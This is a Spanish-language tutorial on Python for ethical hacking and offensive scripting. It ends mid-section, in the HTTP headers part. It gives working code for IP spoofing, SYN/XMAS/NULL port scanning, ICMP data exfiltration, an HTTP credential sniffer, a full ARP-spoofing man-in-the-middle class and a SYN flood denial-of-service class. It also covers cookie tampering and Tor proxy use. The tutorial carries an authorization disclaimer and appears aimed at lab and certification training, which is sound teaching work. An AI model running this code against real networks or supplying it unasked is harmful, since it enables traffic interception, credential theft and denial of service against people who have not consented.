﻿# [python](../raw/pyth0n-f0r-h4ck1ng.md) for Hacking — [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) Ofensivo

## Índice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (2903 lineas)


1. [Introducción](#introduccion)
2. [Configuración del Entorno](#configuracion-del-entorno)
3. [Scapy — Crafting de Paquetes](#scapy--crafting-de-paquetes)
4. [Raw Sockets](#raw-sockets)
5. [HTTP con urllib / requests](#http-con-urllib--requests)
6. [Socket Programming](#socket-programming)
7. [Automatizacion de Exploits](#automatizacion-de-exploits)
8. [Análisis de Archivos](#analisis-de-archivos)
9. [Criptografía](#criptografia)
10. [Web Scraping para OSINT](#web-scraping-para-osint)
11. [API Interaction](#api-interaction)
12. [Automatización y Concurrencia](#automatizacion-y-concurrencia)
13. [Proyectos Completos](#proyectos-completos)
14. [Ejercicios Prácticos](#ejercicios-practicos)

---
## Introducción

Buenas, bienvenido al tutorial mas picante de [python](../raw/pyth0n-f0r-h4ck1ng.md) para hacking etico y [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) ofensivo. Aca no vemos teoria al pedo: todo lo que esta aca lo podes aplicar en entornos controlados, laboratorios como Hack The Box, [tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)-h4ckth3b0x.md#[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)), VulnHub, o tu propio homelab.

Python es el lenguaje mas usado en ciberseguridad ofensiva por una banda de razones:
- Es re facil de leer y escribir
- Tiene una cantidad tremenda de librerias para networking, exploits, analisis
- Corre en Windows, Linux, macOS
- Lo usan herramientas grosas como Impacket, Volatility, Binwalk, Scapy
- Podes prototipear un [exploit](../raw/m3t4spl01t.md#exploits) en 10 lineas

Este tutorial asume que ya sabes Python basico: variables, funciones, condicionales, loops, clases, manejo de excepciones. Si no sabes nada de Python, primero mandate a aprender lo basico y despues volve.

Vamos a cubrir desde lo mas under como raw sockets hasta Proyectos Completos que te van a servir en examenes como OSCP, PNPT, o incluso en tu laburo como pentester.

**Advertencia:** Todo lo que esta aca es con fines educativos. Usalo solo en sistemas donde tengas [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion). Meterle a sistemas sin permiso es ilegal.

---

## Configuración del Entorno

Antes de meter mano, necesitamos tener el entorno bien configurado. Te recomiendo usar Linux (Kali, Parrot, Ubuntu) para la mayoria de los ejemplos, pero todo corre tambien en Windows si sabes configurarlo.

### Entorno Virtual

Siempre, pero SIEMPRE, usa entornos virtuales. No seas animal de instalar librerias globalmente al pedo.

```bash
# En Linux / macOS
python3 -m venv venv-hacking
source venv-hacking/bin/activate

# En Windows PowerShell
python -m venv venv-hacking
.\venv-hacking\Scripts\Activate.ps1
```

### Instalación de Librerías

```bash
pip install scapy
pip install requests urllib3
pip install paramiko pexpect
pip install pefile capstone yara-python
pip install pycryptodome cryptography
pip install beautifulsoup4 scrapy selenium playwright
pip install aiohttp websockets
pip install gql
pip install pytest
```

### Verificar Instalación

```bash
python -c "import scapy; print('Scapy', scapy.__version__)"
python -c "import requests; print('Requests', requests.__version__)"
python -c "import paramiko; print('Paramiko', paramiko.__version__)"
```

---

## 3. Scapy — Crafting de Paquetes

Scapy es una bestia. Te permite crear, enviar, recibir y manipular paquetes de [red](../raw/r3d3s-f0nd4m3nt0s.md) a un nivel de detalle que pocas herramientas te dan. Con Scapy podes:
- Armar paquetes desde cero ([ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip), [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp), [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp), ICMP, [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns), [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp), etc.)
- Enviarlos y recibir respuestas
- Sniffear trafico en vivo
- Implementar ataques como [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing), SYN flood, [dns spoofing](../raw/m1tm-m0b1l3.md#dns-spoofing)
- Escanear puertos con tecnicas especificas (SYN, FIN, NULL, Xmas)

### 3.1. Instalacion y Primeros Pasos

```````python
# 01-scapy/01-intro.py
from scapy.all import *

# Ver capas disponibles
ls()

# Ver campos de un paquete especifico
ls(IP)
ls(TCP)
ls(UDP)
ls(ICMP)
```
### 3.2. Paquetes IP

El paquete IP es la base de todo. Scapy te deja controlar cada campo de la cabecera.

```````python
from scapy.all import *

# Crear un paquete IP basico
paquete = IP()
paquete.show()

# Crear un paquete IP personalizado
paquete = IP(
    src="192.168.1.100",
    dst="192.168.1.1",
    ttl=128,
    id=0x1337,
    flags="DF"
)
paquete.show()

# Spoofing de IP (enviar como si fueras otro)
paquete_spoof = IP(
    src="8.8.8.8",
    dst="192.168.1.10"
)
print("Paquete spoofeado:", paquete_spoof.summary())
```

### 3.3. Paquetes TCP

TCP es el [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) con el que mas vas a laburar.

```````python
from scapy.all import *

# TCP basico
tcp = TCP()
tcp.show()

# Flags TCP: S=SYN, A=ACK, SA=SYN-ACK, F=FIN, R=RST, P=PSH

# Paquete SYN
syn_packet = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")

# Paquete XMAS (FIN+PSH+URG)
xmas_packet = IP(dst="192.168.1.1") / TCP(dport=80, flags="FPU")

# Paquete NULL (sin flags)
null_packet = IP(dst="192.168.1.1") / TCP(dport=80, flags="")

# TCP con payload
payload = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
http_packet = IP(dst="93.184.216.34") / TCP(dport=80, flags="PA") / payload

# Escaneo SYN (half-open scan)
def syn_scan(host, port):
    packet = IP(dst=host) / TCP(dport=port, flags="S")
    resp = sr1(packet, timeout=2, verbose=0)
    if resp is None:
        return "Port %d: Filtered" % port
    elif resp.haslayer(TCP):
        if resp.getlayer(TCP).flags == 0x12:  # SYN-ACK
            rst = IP(dst=host) / TCP(dport=port, flags="R")
            send(rst, verbose=0)
            return "Port %d: Open" % port
        elif resp.getlayer(TCP).flags == 0x14:  # RST-ACK
            return "Port %d: Closed" % port
    return "Port %d: Unknown" % port
```

### 3.4. Paquetes UDP

UDP es mas simple que TCP. No tiene [handshake](../raw/w1f1-4tt4cks.md#handshake) ni flags.

```````python
from scapy.all import *

# UDP basico
udp = UDP()
udp.show()

# Paquete DNS sobre UDP
dns_query = IP(dst="8.8.8.8") / UDP(sport=12345, dport=53) / DNS(
    rd=1,
    qd=DNSQR(qname="example.com", qtype="A")
)

respuesta = sr1(dns_query, timeout=2, verbose=0)
if respuesta and respuesta.haslayer(DNS):
    for answer in respuesta[DNS].an:
        print(answer.rrname, "->", answer.rdata)

# Escaneo UDP
def udp_scan(host, port):
    packet = IP(dst=host) / UDP(dport=port)
    resp = sr1(packet, timeout=2, verbose=0)
    if resp is None:
        return "Port %d: Open|Filtered" % port
    elif resp.haslayer(ICMP):
        if resp.getlayer(ICMP).type == 3 and resp.getlayer(ICMP).code == 3:
            return "Port %d: Closed" % port
    return "Port %d: Unknown" % port
```

### 3.5. Paquetes ICMP

ICMP se usa para diagnostico pero tambien para ataques.

```````python
from scapy.all import *

# ICMP basico
icmp = ICMP()
icmp.show()

# Ping normal
ping = IP(dst="8.8.8.8") / ICMP()
respuesta = sr1(ping, timeout=2, verbose=0)

# Ping con payload (exfiltracion de datos)
secreto = "datos-robados"
ping_exfil = IP(dst="192.168.1.100") / ICMP() / Raw(load=secreto.encode())
send(ping_exfil, verbose=0)

# Traceroute manual
def traceroute_manual(host, max_hops=30):
    for ttl in range(1, max_hops + 1):
        packet = IP(dst=host, ttl=ttl) / ICMP()
        resp = sr1(packet, timeout=2, verbose=0)
        if resp is None:
            print("%d: *" % ttl)
        elif resp.haslayer(ICMP) and resp[ICMP].type == 0:
            print("%d: %s (Llegamos!)" % (ttl, resp[IP].src))
            break
        elif resp.haslayer(ICMP) and resp[ICMP].type == 11:
            print("%d: %s" % (ttl, resp[IP].src))
```

### 3.6. Paquetes DNS

DNS es fundamental para enumeracion.

```````python
from scapy.all import *
import random

# Tipos de registros: A, AAAA, MX, NS, CNAME, SOA, TXT, PTR, SRV

# Consulta A
consulta_a = IP(dst="8.8.8.8") / UDP(sport=random.randint(1024,65535), dport=53) / DNS(
    rd=1, qd=DNSQR(qname="google.com", qtype="A"))
resp = sr1(consulta_a, timeout=3, verbose=0)
if resp and resp.haslayer(DNS):
    for i in range(resp[DNS].ancount):
        print("  %s -> %s" % (resp[DNS].an[i].rrname, resp[DNS].an[i].rdata))

# Consulta MX
consulta_mx = IP(dst="8.8.8.8") / UDP(sport=12345, dport=53) / DNS(
    rd=1, qd=DNSQR(qname="gmail.com", qtype="MX"))
resp = sr1(consulta_mx, timeout=3, verbose=0)
if resp and resp.haslayer(DNS):
    for i in range(resp[DNS].ancount):
        mx = resp[DNS].an[i]
        print("MX %d: %s" % (mx.preference, mx.rdata))

# Transferencia de zona DNS
def dns_zone_transfer(domain, ns_server):
    packet = IP(dst=ns_server) / UDP(sport=12345, dport=53) / DNS(
        rd=1, qd=DNSQR(qname=domain, qtype="AXFR"))
    resp = sr1(packet, timeout=5, verbose=0)
    if resp and resp.haslayer(DNS) and resp[DNS].ancount > 0:
        for i in range(resp[DNS].ancount):
            print("  %s" % resp[DNS].an[i])
    else:
        print("Zone transfer fallo o no permitido")
```
### 3.7. Sniffing de Trafico

Sniffear paquetes con Scapy es tranca. Podes capturar trafico en vivo y aplicar filtros BPF.

```````python
from scapy.all import *
from collections import defaultdict
import datetime

# Sniffing basico (10 paquetes)
paquetes = sniff(count=10)
paquetes.summary()

# Sniffing con filtro BPF
http_packets = sniff(count=5, filter="tcp port 80", timeout=10)

# Sniffing con callback
def procesar_paquete(packet):
    if packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        print("[%s] %s -> %s | %d bytes" % (
            datetime.datetime.now().strftime("%H:%M:%S"),
            src, dst, len(packet)))

sniff(count=5, prn=procesar_paquete, timeout=10)

# Guardar a pcap
paquetes = sniff(count=20)
wrpcap("captura.pcap", paquetes)

# Leer desde pcap
paquetes = rdpcap("captura.pcap")
for pkt in paquetes:
    print(pkt.summary())

# Sniffing de DNS
def dns_sniffer(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        qname = packet[DNS].qd.qname.decode()
        print("[DNS Query] %s -> %s" % (packet[IP].src, qname))

sniff(count=10, filter="udp port 53", prn=dns_sniffer, timeout=30)

# Sniffing de HTTP con credenciales
def http_credential_sniffer(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode(errors="ignore")
            if "password" in payload.lower() or "login" in payload.lower():
                print("[!] Posibles credenciales desde %s" % packet[IP].src)
                print("[!] %s" % payload[:300])
        except:
            pass

sniff(count=10, filter="tcp port 80", prn=http_credential_sniffer, timeout=30)
```

### 3.8. ARP Spoofing

ARP spoofing es el ataque [mitm](../raw/m1tm-m0b1l3.md) clasico.

```````python
from scapy.all import *
import time

def mac_de_ip(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    resp = srp1(packet, timeout=2, verbose=0)
    if resp:
        return resp[Ether].src
    return None

def arp_spoof(target_ip, gateway_ip):
    nuestra_mac = get_if_hwaddr(conf.iface)
    print("[+] Nuestra MAC:", nuestra_mac)
    
    try:
        while True:
            # Target: "gateway tiene mi MAC"
            pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=nuestra_mac)
            # Gateway: "target tiene mi MAC"
            pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=nuestra_mac)
            
            sendp(pkt1, verbose=0)
            sendp(pkt2, verbose=0)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Restaurando ARP...")
        restaurar_arp(target_ip, gateway_ip)
        restaurar_arp(gateway_ip, target_ip)

def restaurar_arp(ip1, ip2):
    mac1 = mac_de_ip(ip1)
    mac2 = mac_de_ip(ip2)
    if mac1 and mac2:
        pkt = Ether(dst=mac2) / ARP(
            op=2, pdst=ip1, psrc=ip2, hwdst=mac2, hwsrc=mac1)
        sendp(pkt, count=4, verbose=0)

# Clase ARP Spoofer completa
class ARPMITM:
    def __init__(self, target_ip, gateway_ip, iface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface or conf.iface
        self.running = False
        self.our_mac = get_if_hwaddr(self.iface)
    
    def get_mac(self, ip):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        resp = srp1(pkt, timeout=2, verbose=0)
        return resp[Ether].src if resp else None
    
    def start_spoof(self):
        self.running = True
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        if not self.target_mac or not self.gateway_mac:
            print("[!] No se pudieron obtener las MACs")
            return
        print("[+] Target MAC: %s" % self.target_mac)
        print("[+] Gateway MAC: %s" % self.gateway_mac)
        
        while self.running:
            pkt1 = Ether(dst=self.target_mac) / ARP(
                op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                hwdst=self.target_mac, hwsrc=self.our_mac)
            pkt2 = Ether(dst=self.gateway_mac) / ARP(
                op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                hwdst=self.gateway_mac, hwsrc=self.our_mac)
            sendp(pkt1, verbose=0)
            sendp(pkt2, verbose=0)
            time.sleep(2)
    
    def stop_spoof(self):
        self.running = False
        if self.target_mac and self.gateway_mac:
            pkt1 = Ether(dst=self.target_mac) / ARP(
                op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                hwdst=self.target_mac, hwsrc=self.gateway_mac)
            pkt2 = Ether(dst=self.gateway_mac) / ARP(
                op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                hwdst=self.gateway_mac, hwsrc=self.target_mac)
            for _ in range(3):
                sendp(pkt1, verbose=0)
                sendp(pkt2, verbose=0)
                time.sleep(0.2)
```

### 3.9. Port Scanner con Scapy

```````python
from scapy.all import *
import random
from concurrent.futures import ThreadPoolExecutor

class ScapyPortScanner:
    def __init__(self, target, timeout=2):
        self.target = target
        self.timeout = timeout
        self.results = {}
    
    def syn_scan(self, port):
        resp = sr1(IP(dst=self.target)/TCP(sport=random.randint(1024,65535),dport=port,flags="S"),
                   timeout=self.timeout, verbose=0)
        if resp is None:
            return "filtered"
        if resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:
                send(IP(dst=self.target)/TCP(sport=resp[TCP].dport,dport=port,flags="R",
                    seq=resp[TCP].ack,ack=resp[TCP].seq+1), verbose=0)
                return "open"
            elif resp[TCP].flags == 0x14:
                return "closed"
        return "unknown"
    
    def scan_ports(self, ports, max_workers=50):
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.syn_scan, p): p for p in ports}
            for future in futures:
                port = futures[future]
                state = future.result()
                if state == "open":
                    print("  [+] Puerto %d: OPEN" % port)
                self.results[port] = state
        return self.results
    
    def generate_report(self):
        open_ports = [p for p, s in self.results.items() if s == "open"]
        print("Puertos abiertos en %s: %s" % (self.target, open_ports))
        return {"target": self.target, "open_ports": open_ports}
```

### 3.10. SYN Flood

```````python
from scapy.all import *
import random
import threading

class SYNFlood:
    def __init__(self, target_ip, target_port, count=1000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.count = count
        self.sent = 0
    
    def random_ip(self):
        return "%d.%d.%d.%d" % (random.randint(1,254), random.randint(0,254),
                                random.randint(0,254), random.randint(1,254))
    
    def send_syn(self):
        packet = IP(src=self.random_ip(), dst=self.target_ip) / TCP(
            sport=random.randint(1024,65535), dport=self.target_port,
            flags="S", seq=random.randint(0,4294967295))
        send(packet, verbose=0)
        self.sent += 1
    
    def start(self):
        print("[*] SYN Flood a %s:%d - %d paquetes" % (self.target_ip, self.target_port, self.count))
        for i in range(self.count):
            self.send_syn()
            if i % 100 == 0 and i > 0:
                print("[+] %d paquetes enviados..." % i)
        print("[+] Total: %d" % self.sent)
```

### 3.11. DNS Query Builder

```````python
from scapy.all import *
import random
from collections import defaultdict

class DNSQueryBuilder:
    def __init__(self, dns_server="8.8.8.8"):
        self.dns_server = dns_server
        self.results = defaultdict(list)
    
    def query(self, domain, qtype="A"):
        pkt = IP(dst=self.dns_server) / UDP(sport=random.randint(1024,65535), dport=53) / DNS(
            rd=1, qd=DNSQR(qname=domain, qtype=qtype))
        return sr1(pkt, timeout=3, verbose=0)
    
    def query_a(self, domain):
        resp = self.query(domain, "A")
        if resp and resp.haslayer(DNS):
            for i in range(resp[DNS].ancount):
                ip = resp[DNS].an[i].rdata
                print("[A] %s -> %s" % (domain, ip))
                self.results["A"].append(ip)
                return ip
    
    def query_mx(self, domain):
        resp = self.query(domain, "MX")
        if resp and resp.haslayer(DNS):
            for i in range(resp[DNS].ancount):
                mx = resp[DNS].an[i]
                rdata = mx.rdata.decode() if isinstance(mx.rdata, bytes) else mx.rdata
                print("[MX] %s -> %s (prio: %d)" % (domain, rdata, mx.preference))
                self.results["MX"].append((mx.preference, rdata))
    
    def query_ns(self, domain):
        resp = self.query(domain, "NS")
        if resp and resp.haslayer(DNS):
            for i in range(resp[DNS].ancount):
                ns = resp[DNS].an[i].rdata
                if isinstance(ns, bytes): ns = ns.decode()
                print("[NS] %s -> %s" % (domain, ns))
                self.results["NS"].append(ns)
    
    def query_txt(self, domain):
        resp = self.query(domain, "TXT")
        if resp and resp.haslayer(DNS):
            for i in range(resp[DNS].ancount):
                txt = resp[DNS].an[i].rdata
                if isinstance(txt, list): txt = b"".join(txt).decode(errors="ignore")
                print("[TXT] %s -> %s" % (domain, txt))
                self.results["TXT"].append(txt)
    
    def query_all(self, domain):
        print("Enumeracion DNS completa para %s" % domain)
        self.query_a(domain)
        self.query_mx(domain)
        self.query_ns(domain)
        self.query_txt(domain)
        return self.results
```

---

## 4. Raw Sockets

Raw sockets te dejan construir paquetes desde cero, sin la abstraccion de Scapy. Esto es mas bajo nivel y te da control total sobre cada byte.

### 4.1. Creacion de Raw Sockets

```````python
import socket
import struct
import sys
import os

def crear_raw_socket(protocolo=socket.IPPROTO_TCP):
    try:
        if sys.platform.startswith("linux"):
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocolo)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        elif sys.platform == "win32":
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocolo)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        else:
            return None
        return sock
    except PermissionError:
        print("Necesitas permisos de administrador/root!")
        return None
```

### 4.2. Paquetes [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) desde Cero

```````python
import socket
import struct
import random

def calcular_checksum(data):
    if len(data) % 2 != 0:
        data += b"\x00"
    checksum = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i+1]
        checksum += word
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    return ~checksum & 0xFFFF

def crear_cabecera_ip(src_ip, dst_ip, protocolo=6, payload_len=0):
    version_ihl = (4 << 4) | 5
    total_length = 20 + payload_len
    pkt_id = random.randint(0, 65535)
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)
    
    header = struct.pack("!BBHHHBBH", version_ihl, 0, total_length, pkt_id,
                         0, 64, protocolo, 0) + src_bytes + dst_bytes
    checksum = calcular_checksum(header)
    header = struct.pack("!BBHHHBBH", version_ihl, 0, total_length, pkt_id,
                         0, 64, protocolo, checksum) + src_bytes + dst_bytes
    return header

def crear_cabecera_tcp(src_port, dst_port, seq_num, ack_num=0, flags=0x02):
    data_offset = (5 << 4) | 0
    return struct.pack("!HHIIBBHHH", src_port, dst_port, seq_num, ack_num,
                       data_offset, flags, 65535, 0, 0)

def pseudo_header_tcp(src_ip, dst_ip, tcp_length):
    return struct.pack("!4s4sBBH", socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, 6, tcp_length)

def crear_paquete_tcp_completo(src_ip, dst_ip, src_port, dst_port, flags=0x02, payload=b""):
    seq = random.randint(0, 2**32-1)
    tcp_hdr = crear_cabecera_tcp(src_port, dst_port, seq, 0, flags)
    tcp_pkt = tcp_hdr + payload
    pseudo = pseudo_header_tcp(src_ip, dst_ip, len(tcp_pkt))
    cs = calcular_checksum(pseudo + tcp_pkt)
    
    tcp_hdr = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, 0,
                          (5<<4)|0, flags, 65535, cs, 0)
    ip_hdr = crear_cabecera_ip(src_ip, dst_ip, 6, len(tcp_hdr + payload))
    return ip_hdr + tcp_hdr + payload

def enviar_paquete_tcp_raw(src_ip, dst_ip, src_port, dst_port, flags=0x02, payload=b""):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        pkt = crear_paquete_tcp_completo(src_ip, dst_ip, src_port, dst_port, flags, payload)
        sock.sendto(pkt, (dst_ip, 0))
        sock.close()
        return True
    except PermissionError:
        print("Permisos insuficientes")
        return False
```

### 4.3. Calculo de Checksums

```````python
import struct
import socket

class ChecksumCalculator:
    @staticmethod
    def ones_complement_sum(data):
        if len(data) % 2 != 0:
            data += b"\x00"
        cs = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            cs += w
            cs = (cs & 0xFFFF) + (cs >> 16)
        return cs
    
    @staticmethod
    def ip_checksum(header):
        return ~ChecksumCalculator.ones_complement_sum(header) & 0xFFFF
    
    @staticmethod
    def tcp_checksum(src_ip, dst_ip, tcp_segment):
        ph = struct.pack("!4s4sBBH", socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, 6, len(tcp_segment))
        return ~ChecksumCalculator.ones_complement_sum(ph + tcp_segment) & 0xFFFF
    
    @staticmethod
    def verify_ip_checksum(packet):
        if len(packet) < 20:
            return False
        stored = struct.unpack("!H", packet[10:12])[0]
        tmp = bytearray(packet[:20])
        tmp[10:12] = b"\x00\x00"
        return stored == ChecksumCalculator.ip_checksum(bytes(tmp))
```

### 4.4. Sniffing de Trafico Crudo

```````python
import socket
import struct
import sys
import datetime

class RawSniffer:
    def __init__(self):
        self.running = False
        self.packet_count = 0
    
    def parse_ip(self, data):
        version_ihl = data[0]
        ihl = (version_ihl & 0x0F) * 4
        total_len = struct.unpack("!H", data[2:4])[0]
        protocol = data[9]
        src = socket.inet_ntoa(data[12:16])
        dst = socket.inet_ntoa(data[16:20])
        return {"src": src, "dst": dst, "protocol": protocol, "ihl": ihl, "total_len": total_len, "data": data[ihl:]}
    
    def parse_tcp(self, data):
        if len(data) < 20:
            return None
        src_port = struct.unpack("!H", data[0:2])[0]
        dst_port = struct.unpack("!H", data[2:4])[0]
        seq = struct.unpack("!I", data[4:8])[0]
        ack = struct.unpack("!I", data[8:12])[0]
        doff = (data[12] >> 4) * 4
        flags = data[13]
        flag_s = []
        if flags & 0x01: flag_s.append("FIN")
        if flags & 0x02: flag_s.append("SYN")
        if flags & 0x04: flag_s.append("RST")
        if flags & 0x08: flag_s.append("PSH")
        if flags & 0x10: flag_s.append("ACK")
        return {"sport": src_port, "dport": dst_port, "seq": seq, "ack": ack,
                "flags": "-".join(flag_s), "payload": data[doff:], "payload_size": len(data)-doff}
    
    def start(self, count=0):
        try:
            if sys.platform.startswith("linux"):
                sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                try:
                    sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
                except:
                    pass
            
            self.running = True
            print("[*] Sniffing...")
            captured = 0
            while self.running and (count == 0 or captured < count):
                data, addr = sock.recvfrom(65535)
                self.packet_count += 1
                ip = self.parse_ip(data)
                print("[%d] %s -> %s proto=%d len=%d" % (self.packet_count, ip["src"], ip["dst"], ip["protocol"], ip["total_len"]))
                if ip["protocol"] == 6:
                    tcp = self.parse_tcp(ip["data"])
                    if tcp:
                        print("  TCP %d->%d [%s] Seq=%d" % (tcp["sport"], tcp["dport"], tcp["flags"], tcp["seq"]))
                captured += 1
        except KeyboardInterrupt:
            print("\n[!] Detenido")
        finally:
            self.running = False
            print("[*] Total: %d paquetes" % self.packet_count)
```

---

## 5. [http](../raw/r3d3s-f0nd4m3nt0s.md#http) con urllib / requests

Trabajar con HTTP es fundamental para web hacking, automatizacion de ataques, y [osint](../raw/0s1nt.md).

### 5.1. Requests Basico

```````python
import requests

# GET basico
resp = requests.get("https://httpbin.org/get")
print("Status:", resp.status_code)
print("Headers:", dict(resp.headers))
print("Body:", resp.text[:200])

# GET con parametros
params = {"name": "Juan", "age": "30"}
resp = requests.get("https://httpbin.org/get", params=params)
print("URL:", resp.url)

# POST con formulario
data = {"username": "admin", "password": "123456"}
resp = requests.post("https://httpbin.org/post", data=data)
print(resp.json()["form"])

# POST con JSON
json_data = {"command": "whoami", "args": []}
resp = requests.post("https://httpbin.org/post", json=json_data)
print(resp.json()["json"])

# PUT, DELETE, HEAD
resp = requests.put("https://httpbin.org/put", data={"key": "value"})
resp = requests.delete("https://httpbin.org/delete")
resp = requests.head("https://httpbin.org/get")
```

### 5.2. Session Handling

```````python
import requests

# Session object (mantiene cookies)
session = requests.Session()

# Login
login_data = {"username": "admin", "password": "password123"}
login_resp = session.post("https://httpbin.org/post", data=login_data)

# La sesion mantiene las cookies
profile_resp = session.get("https://httpbin.org/cookies")
print("Cookies:", dict(session.cookies))

# Configurar defaults
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept-Language": "es-AR,es;q=0.9,en;q=0.8"
})

# Autenticacion basica
session.auth = ("admin", "secret")

# Proxies globales
session.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Desactivar verificacion SSL (util en pentesting)
session.verify = False

# Pool de conexiones
from requests.adapters import HTTPAdapter
adapter = HTTPAdapter(pool_connections=10, pool_maxsize=20, max_retries=3)
session.mount("http://", adapter)
session.mount("https://", adapter)

# Flujo de login completo
def login_flow(url_base, username, password):
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    
    # Obtener CSRF token
    login_page = s.get("%s/login" % url_base)
    import re
    csrf = re.search(r"name=\"csrf_token\"\s+value=\"([^\"]+)\"", login_page.text)
    token = csrf.group(1) if csrf else "none"
    
    # Login
    resp = s.post("%s/login" % url_base, data={"username": username, "password": password, "csrf_token": token})
    if "logout" in resp.text.lower():
        print("[+] Login exitoso!")
    return s

# Guardar/Cargar sesion
import pickle
def save_session(session, filename="session.pkl"):
    with open(filename, "wb") as f:
        pickle.dump(session.cookies, f)

def load_session(filename="session.pkl"):
    s = requests.Session()
    with open(filename, "rb") as f:
        s.cookies.update(pickle.load(f))
    return s
```

### 5.3. Cookie Manipulation

```````python
import requests
from requests.cookies import cookiejar_from_dict

# Enviar cookies manualmente
cookies = {"session": "abc123", "admin": "true"}
resp = requests.get("https://httpbin.org/cookies", cookies=cookies)
print(resp.json())

# Cookie jar
jar = cookiejar_from_dict({"session": "eyJ1c2VyIjoiYWRtaW4ifQ"})
resp = requests.get("https://httpbin.org/cookies", cookies=jar)

# Modificar cookies de sesion
session = requests.Session()
session.cookies.set("admin", "true", domain="httpbin.org")
session.cookies.set("role", "administrator", domain="httpbin.org")
```

### 5.4. [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) Configuration

```````python
import requests

# Proxy HTTP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
resp = requests.get("https://httpbin.org/get", proxies=proxies)

# Proxy con auth
proxies_auth = {"http": "http://user:pass@127.0.0.1:8080"}
resp = requests.get("https://httpbin.org/get", proxies=proxies_auth)

# Proxy rotativo
proxy_pool = [{"http": "http://p1:8080"}, {"http": "http://p2:8080"}]
import random
for _ in range(5):
    proxy = random.choice(proxy_pool)
    try:
        resp = requests.get("https://httpbin.org/get", proxies=proxy, timeout=5)
    except:
        pass

# Tor proxy
session = requests.Session()
session.proxies = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
```

### 5.5. Timeout y Retry

```````python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import time

# Timeout
try:
    resp = requests.get("https://httpbin.org/delay/10", timeout=3)
except requests.Timeout:
    print("Timeout!")

# Timeout separado (connect, read)
resp = requests.get("https://httpbin.org/delay/10", timeout=(2, 5))

# Retry con backoff
session = requests.Session()
retry = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503],
              allowed_methods=["HEAD", "GET", "PUT", "DELETE", "OPTIONS", "POST"])
adapter = HTTPAdapter(max_retries=retry)
session.mount("http://", adapter)
session.mount("https://", adapter)

# Retry personalizado
def request_with_retry(url, max_retries=3, delay=1):
    for attempt in range(max_retries):
        try:
            resp = requests.get(url, timeout=5)
            resp.raise_for_status()
            return resp
        except (requests.ConnectionError, requests.Timeout) as e:
            if attempt < max_retries - 1:
                print("Reintentando en %ds..." % (delay * (attempt + 1)))
                time.sleep(delay * (attempt + 1))
            else:
                raise
```

### 5.6. Custom Headers

```````python
import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-AR,es;q=0.9,en;q=0.8",
    "Referer": "https://google.com",
